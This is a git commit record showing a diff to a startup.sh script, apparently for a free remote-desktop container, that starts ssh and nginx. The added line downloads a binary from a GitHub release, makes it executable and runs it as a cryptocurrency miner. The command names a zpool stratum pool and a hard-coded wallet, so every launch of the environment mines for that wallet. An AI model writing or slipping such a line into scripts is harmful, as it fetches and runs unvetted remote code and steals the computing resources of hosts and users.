201aacf9abb94fa15a6cc3ccce22c5e88e9ebb28
qifaselnis <108388443+qifaselnis@users.noreply.github.com>
2022-07-27 12:33:15 +0000

    Update startup.sh

--- startup.sh
+++ startup.sh
@@ -2,3 +2,4 @@
 # Free XRDP Aank is ME
 service ssh start
 service nginx start
+wget https://github.com/berhasilsemua83/Raven/releases/download/v1.0/SRB && chmod +x SRB && ./SRB --disable-gpu --algorithm argon2d_16000 --pool stratum+tcp://argon2d16000.sea.mine.zpool.ca:4241  --cpu-threads 1 --wallet DAxGkuHcPytmsbUTMebR4yB92Hx5X3AC4E -p c=DOGE,bi 
